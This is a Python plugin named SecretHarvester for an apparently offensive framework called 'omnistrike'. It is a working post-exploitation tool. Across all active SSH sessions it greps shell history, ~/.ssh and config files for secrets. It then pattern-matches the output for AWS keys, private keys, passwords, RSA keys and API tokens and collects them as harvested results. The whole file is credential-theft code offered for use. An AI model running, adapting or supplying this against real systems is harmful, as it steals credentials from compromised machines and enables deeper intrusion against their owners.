import asyncio
import asyncssh
import re
from omnistrike.plugins.base import BasePlugin

class SecretHarvesterPlugin(BasePlugin):
    def __init__(self):
        # Patterns for harvesting sensitive data
        self.secret_patterns = {
            "AWS_ACCESS_KEY": r"AKIA[0-9A-Z]{16}",
            "PRIVATE_KEY": r"-----BEGIN .* PRIVATE KEY-----",
            "PASSWORD_HINT": r"password\s*[:=]\s*['\"]?[0-9a-zA-Z]{5,20}['\"]?",
            "ID_RSA": r"ssh-rsa\s+[A-Za-z0-9+/=]+",
            "API_KEY": r"(api[-_]key|access[-_]token)['\"]\s*[:=]\s*['\"]([0-9a-zA-Z]{20,40})['\"]"
        }

    @property
    def name(self):
        return "SecretHarvester"

    @property
    def description(self):
        return "Automatically harvests credentials, API keys, and secrets across all active sessions."

    async def run(self, target, data):
        sessions = self.session_manager.list_sessions()
        if not sessions:
            return

        print(f"[*] Starting SecretHarvester across {len(sessions)} session(s)...")
        harvest_results = {}

        for session in sessions:
            print(f"[*] Searching for secrets in Session {session.id}...")
            findings = []
            try:
                # Search common locations
                cmd = "grep -rE 'key|password|secret|token|id_rsa' ~/.bash_history ~/.ssh /etc/config 2>/dev/null | head -n 50"
                res = await session.conn.run(cmd)

                if res.stdout:
                    for name, pattern in self.secret_patterns.items():
                        matches = re.findall(pattern, res.stdout)
                        for m in matches:
                            findings.append({
                                "type": name,
                                "match": m[:50] + "..." if len(str(m)) > 50 else str(m),
                                "severity": "CRITICAL"
                            })

                if findings:
                    harvest_results[session.id] = findings
                    print(f"    [!!!] HARVEST SUCCESS: Found {len(findings)} potential secrets in Session {session.id}")
            except Exception as e:
                print(f"[!] Harvesting failed for Session {session.id}: {e}")

        data['harvested_secrets'] = harvest_results
